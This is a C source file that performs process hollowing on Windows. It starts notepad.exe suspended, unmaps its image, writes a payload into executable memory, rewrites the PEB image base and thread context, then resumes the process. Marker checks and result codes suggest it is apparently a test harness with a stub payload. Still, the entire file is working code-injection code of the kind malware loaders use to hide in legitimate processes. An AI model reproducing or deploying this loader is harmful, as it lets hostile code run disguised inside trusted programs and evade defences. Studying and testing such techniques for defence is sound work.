#include <windows.h>
#include <string.h>
#include "../common/c1_marker.h"
#include "../common/c1_return_payload.h"

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI *pfn_nt_unmap_view_of_section)(HANDLE, PVOID);

int main(void) {
    char target[MAX_PATH];
    char current_directory[MAX_PATH];
    if (!GetSystemDirectoryA(target, sizeof(target)) ||
        lstrlenA(target) + lstrlenA("\\notepad.exe") >= (int)sizeof(target)) {
        return 1;
    }
    lstrcatA(target, "\\notepad.exe");
    if (!GetCurrentDirectoryA(sizeof(current_directory), current_directory)) return 1;

    STARTUPINFOA startup = { .cb = sizeof(startup) };
    PROCESS_INFORMATION process = { 0 };
    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, current_directory, &startup, &process)) {
        return 1;
    }

    int result = 1;
    CONTEXT context = { .ContextFlags = CONTEXT_FULL };
    PVOID image_base = NULL;
    SIZE_T transferred = 0;

    if (!GetThreadContext(process.hThread, &context)) {
        result = 4;
        goto cleanup;
    }
#if defined(_WIN64)
    DWORD64 peb_address = context.Rdx;
    if (!ReadProcessMemory(process.hProcess, (LPCVOID)(peb_address + 16), &image_base, sizeof(image_base), &transferred) ||
        transferred != sizeof(image_base)) {
        result = 5;
        goto cleanup;
    }
#else
    DWORD peb_address = context.Ebx;
    if (!ReadProcessMemory(process.hProcess, (LPCVOID)(peb_address + 8), &image_base, sizeof(image_base), &transferred) ||
        transferred != sizeof(image_base)) goto cleanup;
#endif

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC resolved = ntdll ? GetProcAddress(ntdll, "NtUnmapViewOfSection") : NULL;
    pfn_nt_unmap_view_of_section unmap = NULL;
    if (resolved) memcpy(&unmap, &resolved, sizeof(unmap));
    if (!unmap || unmap(process.hProcess, image_base) != 0) {
        result = 6;
        goto cleanup;
    }

    LPVOID replacement = VirtualAllocEx(
        process.hProcess,
        image_base,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!replacement) {
        result = 7;
        goto cleanup;
    }
    if (!WriteProcessMemory(process.hProcess, replacement, payload, payload_len, &transferred) || transferred != payload_len) {
        result = 8;
        goto cleanup;
    }

#if defined(_WIN64)
    if (!WriteProcessMemory(process.hProcess, (LPVOID)(peb_address + 16), &replacement, sizeof(replacement), &transferred) ||
        transferred != sizeof(replacement)) {
        result = 9;
        goto cleanup;
    }
    context.Rip = (DWORD64)(ULONG_PTR)replacement;
    context.Rcx = (DWORD64)(ULONG_PTR)replacement;
#else
    if (!WriteProcessMemory(process.hProcess, (LPVOID)(peb_address + 8), &replacement, sizeof(replacement), &transferred) ||
        transferred != sizeof(replacement)) goto cleanup;
    context.Eip = (DWORD)(ULONG_PTR)replacement;
#endif
    if (!SetThreadContext(process.hThread, &context)) {
        result = 10;
        goto cleanup;
    }

    c1_reset_marker();
    if (ResumeThread(process.hThread) == (DWORD)-1) {
        result = 11;
        goto cleanup;
    }
    if (WaitForSingleObject(process.hProcess, 5000) != WAIT_OBJECT_0) {
        result = 12;
        goto cleanup;
    }
    DWORD process_exit = 1;
    if (!GetExitCodeProcess(process.hProcess, &process_exit) || process_exit != 0) {
        result = 13;
        goto cleanup;
    }
    result = c1_write_marker() && c1_marker_passed() ? 0 : 14;

cleanup:
    if (process.hProcess) TerminateProcess(process.hProcess, 0);
    if (process.hThread) CloseHandle(process.hThread);
    if (process.hProcess) CloseHandle(process.hProcess);
    return result;
}
